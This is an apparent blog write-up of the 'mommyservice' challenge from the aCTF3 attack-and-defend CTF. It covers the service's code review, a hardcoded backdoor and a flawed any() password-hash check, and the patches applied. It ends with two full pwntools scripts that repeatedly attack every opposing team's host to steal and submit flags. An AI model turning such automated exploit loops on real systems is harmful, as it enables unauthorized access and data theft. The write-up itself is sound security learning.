---
layout: single
title:  "aCTF3 - mommyservice Writeup"
last_modified_at: 2021-11-16
---

A post about the `mommyservice` from `aCTF3`.

Before we start, I want to thank:

- *@redgate* for helping us setup, giving us a few pointers, and answering our questions (`pwntools` is dank).
- *@mahaloz* and *@fish* for letting us play :)

# Intro

This weekend, I played my first attack and defend style CTF with *@SirSquibbins* under team **sashimi**. This CTF was very cool and well organized. I also liked the 4 hours length, short enough to spare my monitor for another day (:anger::punch::computer:), long enough to learn and practice something cool.

# Setting up and picking a challenge

After connecting via `ssh`, we got the following message:

>All services are running insider their own Docker containers. Their ports are
>mapped to the host, starting from 10001.
>
>Each challenge is located at /opt/ictf/services inside its directory. You may
>modify the files inside to patch your services.

I spent the time before the game understanding the game infrastructure, testing `swpag_client`, and spamming *@redgate* with questions.

We were provided 3 services:

- `bl4ckg0ld`
- `dungeon`
- `mommyservice`

I spent the entire time on `mommyservice`, so I will only talk about that in this post.

# Code review and interacting with mommyservice

## Main serv()

I looked at the source code first before interacting with the service.

`baby_id` in this challenge is the `flag_id` of each team, which can be found using the game API, `swpag_client`.

In the main service function, it calls `backdoor()` when the encrypted md5 hash of input equals the hash (`f696...`), wh equals `yeet`.

So, the main service function takes an input and calls different functions accordingly.

- `1` ➡ `name_a_baby()`
- `2` ➡ `get_baby_name()`
- `yeet` ➡ `backdoor()`
- `3` ➡ `print bye message`
- `anything else` ➡ `print error message`

Let's break down the functions.

## name_a_baby()

- generate a random `baby_id`, ask for the `baby_name`.
- generate a random password.
- write the password and `baby_name` to file, using `baby_id` as file name.
- print the `baby_id`, password, and other messages.

![](../assets/posts/2021-11-13-actf3-writup/images/call_name_a_baby.png)

## get_baby_name() :exclamation:

- ask for `baby_id`
- check if file with `baby_id` name exists
    - ask for password.
    - read file `baby_id` and extract the contents.
    - calculate the first 8 bytes of SHA256 hash of the input password.
    - calculate the first 8 bytes of SHA256 hash of the `baby_id`'s password.
    - :exclamation: check if **any** byte of input hash equals to **any** byte in password hash.
        - print the `baby_name` associated with the `baby_id`.

![](../assets/posts/2021-11-13-actf3-writup/images/call_get_baby_name.png)

## backdoor() :exclamation:

- print hint and ask for `baby_id`.
- :exclamation: iterate through each file and directory, checks if file with `baby_id` name exists.
    - read file `baby_id` and print its password.

![](../assets/posts/2021-11-13-actf3-writup/images/call_backdoor.png)

# Vulnerabilities and patches

## backdoor() :+1:

The `backdoor()` function takes `baby_id` and prints its password.

The `get_baby_name` function takes `baby_id` and its password, then print the `baby_name` associated with the `baby_id`.

So, we need to:

1. send each team's `flag_id` to `backdoor()` to get password of `flag_id`.
2. send `flag_id` and its password to `get_baby_name`, which is the name of `flag_id`.

### Demo 

For this demo, I created my own baby name `flag{close_your_backdoor}`, which have `P48IFFfxrS` as its `baby_id` and `MXTukjsUQL3OLsnj1C7O` as its password

![](../assets/posts/2021-11-13-actf3-writup/images/backdoor_demo.png)

### Patch

We patched this by just not calling it in the main service function, replace `backdoor()` with `pass`.

![](../assets/posts/2021-11-13-actf3-writup/images/backdoor_patched.png)

## get_baby_name() :fire:

We didn't see this until later in the game, but we still got a lot of points from it.

```python
if any(b0 == b1 for b0, b1 in zip(hash_0, hash_1)):
```

We have control of `hash_0` and `b0` since they are the SHA265 hash bytes of our input.

The `any()` function is used, so if **any** of our input hash bytes (`b0`) match **any** of the password hash bytes (`b1`), it will pass.

We can brute force all the possibilities of a hash byte (`b1`) (256 possibilities).

input ➡ SHA256 ➡ input hash bytes

We want all the input that leads to a unique hash byte. The number of unique hash bytes should be 256.

To pass the password check and get the flag, our best case would be 1 attempt and worst case 256 attempts.

I made a test script to show how it works.

```python
import hashlib
import string
import random

def gen_byte_map():
    byte_map = {}

    for input_i in range(2000):
        new_hash_byte = hashlib.sha256(str(input_i).encode("ascii")).digest()[:1] # get first hash byte of input_i
        new_hash_int = int.from_bytes(new_hash_byte, "little")   # convert byte to int

        if new_hash_int not in byte_map: # not in dic
            byte_map[str(new_hash_int)] = input_i  # add to dic, new_hash_int:input_i

        if len(list(byte_map.keys())) == 256: # got all the possible hash bytes
            break

    return (list(byte_map.keys()))

def get_random_password(len):
    chars_lst = []

    charset = string.ascii_letters + string.digits

    for i in range(len):
        chars_lst.append(random.choice(charset))

    return "".join(chars_lst)

def find_match(input_hash_bytes, password_hash_bytes):
    # basically same as:
    # any(b0 == b1 for b0, b1 in zip(hash_0, hash_1))

    for b0, b1 in zip(input_hash_bytes, password_hash_bytes):
        if (b0 == b1):
            print("match bytes found: {}, {}".format(str(b0),str(b1)))
            return True

def verify():
    byte_map = gen_byte_map()

    password = get_random_password(10) # get a random 10 characters password

    # calculate the first 8 bytes of SHA256 hash of the actual password.
    password_hash_bytes = hashlib.sha256(password.encode("ascii")).digest()[:8]

    for num_str in byte_map:
        # calculate the first 8 bytes of SHA256 hash of the input password.
        input_hash_bytes = hashlib.sha256(num_str.encode("ascii")).digest()[:8]

        # another way of doing
        if find_match(input_hash_bytes, password_hash_bytes):
            break # break at first match found

    print("password: " + password)
    print("password_hash_bytes: ")
    print([b0 for b0 in input_hash_bytes])
    print("input_hash_bytes: ")
    print([b1 for b1 in password_hash_bytes])
    print("\n")

if __name__ == "__main__":
    for i in range(4):
        verify();
```

### Demo 

For this demo, I created my own baby name `flag{all_is_not_any}`, which have `rFHFHXfRa4` as its `baby_id` and `zK0VBBADEPnGODHVBFjN` as its password

![](../assets/posts/2021-11-13-actf3-writup/images/get_baby_demo.png)

![](../assets/posts/2021-11-13-actf3-writup/images/get_baby_demo2.png)

### Patch

We patched this by changing `any` to `all` in the check condition within the function.

This will check if **all** of our input hash bytes (`b0`) match **all** of the password hash bytes (`b1`).

```python
if all(b0 == b1 for b0, b1 in zip(hash_0, hash_1)):
```

![](../assets/posts/2021-11-13-actf3-writup/images/get_baby_patched.png)

# Scripts

## backdoor() exploit

```python
from pwn import remote, context
from swpag_client import Team
import time

context.log_level = "error"

t = Team("REDACTED", "REDACTED")

def exp(host_ip, flag_id):
    flags = []

    try:
        # send "yeet" to call backdoor(), which return passphrase
        p = remote(host_ip, 10003)

        p.sendline("yeet") # backdoor()

        p.recvuntil("?") # ask for baby id

        p.sendline(flag_id) # send baby id

        p.recvuntil("?\n") # blah

        password = p.recvuntil("\n").strip()

        p.close()

        # send baby id and password to get flag
        p = remote(host_ip, 10003)

        p.sendline("2") # get_baby_name()

        menu_message = p.recvuntil(": ")

        p.sendline(flag_id.strip()) # send baby id

        baby_message = p.recvuntil(": ")

        p.sendline(password) # send password

        before_baby = p.recvuntil(": ")

        before_flag = p.recvuntil(": ")

        flag = p.recvuntil("\n").strip()

        flags.append(flag.decode("ascii")) # save flag

    except:
        pass

    p.close()
    return flags

if __name__ == "__main__":
    while True:
        print(f"--- Starting attack at: {time.ctime()} ---")
        for target in t.get_targets(3):  # iterate through all the target
            flag_id = target['flag_id']  # get their baby id
            host_ip = target['hostname'] # get their hostname
            try:
                flags = exp(host_ip, flag_id)
                print(flags)
                stat = t.submit_flag(flags)
                print(stat)
            except:
                pass
        print("--- Attack done. ---")
        time.sleep(30)
```

## get_baby_name() exploit

```python
from pwn import remote, context
import hashlib
import string
from swpag_client import Team
import time

context.log_level = "error"

t = Team("REDACTED", "REDACTED")

def gen_byte_map():
    byte_map = {}

    for input_i in range(2000):
        new_hash_byte = hashlib.sha256(str(input_i).encode("ascii")).digest()[:1] # get first hash byte of input_i
        new_hash_int = int.from_bytes(new_hash_byte, "little")   # convert byte to int

        if new_hash_int not in byte_map: # not in dic
            byte_map[str(new_hash_int)] = input_i  # add to dic, new_hash_int:input_i

        if len(list(byte_map.keys())) == 256: # got all the possible hash bytes
            break

    return (list(byte_map.keys()))

def exp(host_ip, flag_id):
    flags = []

    byte_map = gen_byte_map() # ['95', '107', '212', '78', '75', '239', '231', '121', '44', '25', ...]

    for num_str in byte_map:
        try:
            p = remote(host_ip, 10003)

            menu_message = p.recvuntil(": ")

            p.sendline("2") # get_baby_name()

            baby_message = p.recvuntil(": ")

            p.sendline(flag_id.strip()) # baby id

            pass_message = p.recvuntil(": ")

            p.sendline(num_str) # password

            pass_resp = p.recvline().decode("ascii")

            if "Error" not in pass_resp: # got flag
                flag = pass_resp.split(":")[1].strip()
                flags.append(flag)
                print("byte found!")
                break

            p.close()

        except:
            pass

    return flags

if __name__ == "__main__":
    while True:
        print(f"--- Starting attack at: {time.ctime()} ---")
        for target in t.get_targets(3):  # iterate through all the target
            flag_id = target['flag_id']  # get their baby id
            host_ip = target['hostname'] # get their hostname
            try:
                flags = exp(host_ip, flag_id)
                print(flags)
                stat = t.submit_flag(flags)
                print(stat)
            except:
                pass
        print("--- Attack done. ---")
        time.sleep(30)
```
